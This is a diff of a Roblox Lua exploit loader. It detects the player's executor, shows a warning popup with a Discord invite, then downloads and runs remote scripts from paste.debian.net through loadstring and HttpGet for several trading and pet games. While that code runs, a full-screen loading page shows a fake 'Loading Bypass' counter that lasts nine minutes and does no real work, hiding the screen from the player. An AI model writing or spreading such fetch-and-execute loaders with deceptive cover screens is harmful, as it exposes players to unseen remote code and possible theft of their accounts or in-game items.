@@ -1,6 +1,5 @@
 local TweenService = game:GetService("TweenService")
 local CoreGui = game:GetService("CoreGui")
-local Lighting = game:GetService("Lighting")
 local placeId = game.PlaceId
 
 -- Game info for themed loading screens
@@ -40,48 +39,93 @@ local gameInfo = {
             "Trading Plaza is where players trade rare pets."
         },
         script = "https://paste.debian.net/plainh/f7e3fafa/"
-    },
-    [18901165922] = { -- Pets GO
-        bgColor = Color3.fromRGB(255, 165, 0),
-        title = "PETS GO 🐕🏃",
-        facts = {
-            "Pets GO is inspired by Pet Simulator mechanics.",
-            "You can race pets to earn rewards.",
-            "Some pets can only be unlocked during events.",
-            "The game updates frequently with new worlds."
-        },
-        script = "https://paste.debian.net/plainh/b11ed528/"
-    },
-    [920587237] = { -- Adopt Me
-        bgColor = Color3.fromRGB(255, 192, 203),
-        title = "ADOPT ME 🍼🐕",
-        facts = {
-            "Adopt Me has a huge trading community.",
-            "Pets can be evolved into Neons.",
-            "You can own vehicles and houses.",
-            "Regular events drop rare pets."
-        },
-        script = "https://paste.debian.net/plainh/e1b2c69b/"
-    },
-    [2753915549] = { -- Blox Fruits
-        bgColor = Color3.fromRGB(0, 0, 0),
-        title = "BLOX FRUITS 🍉⚔️",
-        facts = {
-            "Blox Fruits has over 8 billion visits.",
-            "You can unlock powerful fruits with unique skills.",
-            "PvP battles are intense and competitive.",
-            "The game is inspired by One Piece anime."
-        },
-        script = "https://paste.debian.net/plainh/dcc899d0/"
     }
 }
 
 local gameData = gameInfo[placeId]
 
--- Blur effect
-local blur = Instance.new("BlurEffect", Lighting)
-blur.Size = 40
+-- Executor detection
+local executor = (identifyexecutor and identifyexecutor() or "Unknown")
+executor = tostring(executor)
 
+-- Executor warning GUI
+local gui = Instance.new("ScreenGui")
+gui.Name = "ExecutorWarningGUI"
+gui.ResetOnSpawn = false
+gui.Parent = CoreGui
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 450, 0, 200)
+frame.Position = UDim2.new(0.5, -225, 0.5, -100)
+frame.BackgroundColor3 = Color3.fromRGB(25,25,25)
+frame.BorderSizePixel = 2
+frame.BorderColor3 = Color3.fromRGB(0,150,255)
+frame.Parent = gui
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0,10)
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1,-20,0,40)
+title.Position = UDim2.new(0,10,0,10)
+title.BackgroundTransparency = 1
+title.Font = Enum.Font.GothamBold
+title.TextSize = 24
+title.TextXAlignment = Enum.TextXAlignment.Center
+title.TextYAlignment = Enum.TextYAlignment.Center
+title.Parent = frame
+
+local msg = Instance.new("TextLabel")
+msg.Size = UDim2.new(1,-40,1,-100)
+msg.Position = UDim2.new(0,20,0,60)
+msg.BackgroundTransparency = 1
+msg.TextWrapped = true
+msg.TextXAlignment = Enum.TextXAlignment.Center
+msg.TextYAlignment = Enum.TextYAlignment.Top
+msg.Font = Enum.Font.Gotham
+msg.TextColor3 = Color3.fromRGB(255,255,255)
+msg.TextSize = 18
+msg.Parent = frame
+
+-- Discord copy button
+local discordBtn = Instance.new("TextButton")
+discordBtn.Size = UDim2.new(0,180,0,35)
+discordBtn.Position = UDim2.new(0.5,-90,1,-70)
+discordBtn.BackgroundColor3 = Color3.fromRGB(114,137,218)
+discordBtn.Text = "Copy Discord Invite"
+discordBtn.Font = Enum.Font.GothamBold
+discordBtn.TextSize = 16
+discordBtn.TextColor3 = Color3.fromRGB(255,255,255)
+discordBtn.Parent = frame
+Instance.new("UICorner", discordBtn).CornerRadius = UDim.new(0,6)
+
+discordBtn.MouseButton1Click:Connect(function()
+    setclipboard("https://discord.gg/PZNK3DCrVQ")
+    discordBtn.Text = "Copied!"
+    task.delay(2,function() discordBtn.Text = "Copy Discord Invite" end)
+end)
+
+-- OK button
+local okBtn = Instance.new("TextButton")
+okBtn.Size = UDim2.new(0,140,0,35)
+okBtn.Position = UDim2.new(0.5,-70,1,-25)
+okBtn.BackgroundColor3 = Color3.fromRGB(0,120,255)
+okBtn.Text = "OK!"
+okBtn.TextColor3 = Color3.fromRGB(255,255,255)
+okBtn.Font = Enum.Font.GothamBold
+okBtn.TextSize = 18
+okBtn.Parent = frame
+Instance.new("UICorner", okBtn).CornerRadius = UDim.new(0,6)
+
+if string.find(string.lower(executor),"delta") then
+    title.Text = "⚠️ DELTA USERS"
+    title.TextColor3 = Color3.fromRGB(220,20,20)
+    msg.Text = "Delta lacks TeleportService support.\nUse CODEX for full functionality.\nPress OK to continue."
+else
+    title.Text = "TO " .. string.upper(executor) .. " USERS!"
+    title.TextColor3 = Color3.fromRGB(255,215,0)
+    msg.Text = "Script requires 2-5 minutes to download resources.\nPress OK to continue."
+end
+
+-- Function to create loading screen
 local function createLoadingScreen(info)
     local gui = Instance.new("ScreenGui", CoreGui)
     gui.Name = "LoadingScreen"
@@ -91,20 +135,17 @@ local function createLoadingScreen(info)
     local bg = Instance.new("Frame", gui)
     bg.Size = UDim2.new(1,0,1,0)
     bg.BackgroundColor3 = Color3.new(0,0,0)
-    bg.BackgroundTransparency = 0
 
-    -- Title
-    local title = Instance.new("TextLabel", bg)
-    title.AnchorPoint = Vector2.new(0.5,0.5)
-    title.Position = UDim2.new(0.5,0,0.35,0)
-    title.Size = UDim2.new(0.9,0,0.15,0)
-    title.BackgroundTransparency = 1
-    title.Text = info.title
-    title.TextColor3 = Color3.new(1,1,1)
-    title.TextScaled = true
-    title.Font = Enum.Font.GothamBlack
+    local titleLbl = Instance.new("TextLabel", bg)
+    titleLbl.AnchorPoint = Vector2.new(0.5,0.5)
+    titleLbl.Position = UDim2.new(0.5,0,0.35,0)
+    titleLbl.Size = UDim2.new(0.9,0,0.15,0)
+    titleLbl.BackgroundTransparency = 1
+    titleLbl.Text = info.title
+    titleLbl.TextColor3 = Color3.new(1,1,1)
+    titleLbl.TextScaled = true
+    titleLbl.Font = Enum.Font.GothamBlack
 
-    -- Fun facts at bottom
     local fact = Instance.new("TextLabel", bg)
     fact.AnchorPoint = Vector2.new(0.5,0)
     fact.Position = UDim2.new(0.5,0,0.85,0)
@@ -120,24 +161,6 @@ local function createLoadingScreen(info)
             fact.Text = info.facts[index]
             index = (index % #info.facts) + 1
             task.wait(8)
-        end
-    end)
-
-    -- Loading bypass
-    local bypass = Instance.new("TextLabel", bg)
-    bypass.AnchorPoint = Vector2.new(0.5,0)
-    bypass.Position = UDim2.new(0.5,0,0.9,0)
-    bypass.Size = UDim2.new(0.5,0,0.05,0)
-    bypass.BackgroundTransparency = 1
-    bypass.TextColor3 = Color3.new(1,1,1)
-    bypass.TextScaled = true
-    bypass.Font = Enum.Font.GothamBold
-
-    local maxBypass = 25200
-    task.spawn(function()
-        for i=0,maxBypass do
-            bypass.Text = "Loading Bypass " .. i .. "/" .. maxBypass
-            task.wait(540/ maxBypass) -- 9 minutes
         end
     end)
 
@@ -184,21 +207,44 @@ local function createLoadingScreen(info)
         end)
     end)
 
+    -- Loading bypass
+    local bypass = Instance.new("TextLabel", bg)
+    bypass.AnchorPoint = Vector2.new(0.5,0)
+    bypass.Position = UDim2.new(0.5,0,0.9,0)
+    bypass.Size = UDim2.new(0.5,0,0.05,0)
+    bypass.BackgroundTransparency = 1
+    bypass.TextColor3 = Color3.new(1,1,1)
+    bypass.TextScaled = true
+    bypass.Font = Enum.Font.GothamBold
+
+    local maxBypass = 25200
+    task.spawn(function()
+        for i=0,maxBypass do
+            bypass.Text = "Loading Bypass " .. i .. "/" .. maxBypass
+            task.wait(540/ maxBypass)
+        end
+    end)
+
     return gui
 end
 
-if gameData then
-    task.spawn(function()
-        local ok, err = pcall(function()
-            if typeof(gameData.script) == "function" then
-                gameData.script()
-            else
-                loadstring(game:HttpGet(gameData.script,true))()
-            end
+-- OK button behavior
+okBtn.MouseButton1Click:Connect(function()
+    gui:Destroy()
+
+    if gameData then
+        createLoadingScreen(gameData)
+        task.spawn(function()
+            local ok, err = pcall(function()
+                if typeof(gameData.script) == "function" then
+                    gameData.script()
+                else
+                    loadstring(game:HttpGet(gameData.script,true))()
+                end
+            end)
+            if not ok then warn("[Loader] Failed to run script:",err) end
         end)
-        if not ok then warn("[Loader] Failed to run script:",err) end
-    end)
-    createLoadingScreen(gameData)
-else
-    warn("[Loader] No script for this PlaceId:",placeId)
-end
+    else
+        warn("[Loader] No script for this PlaceId:",placeId)
+    end
+end)
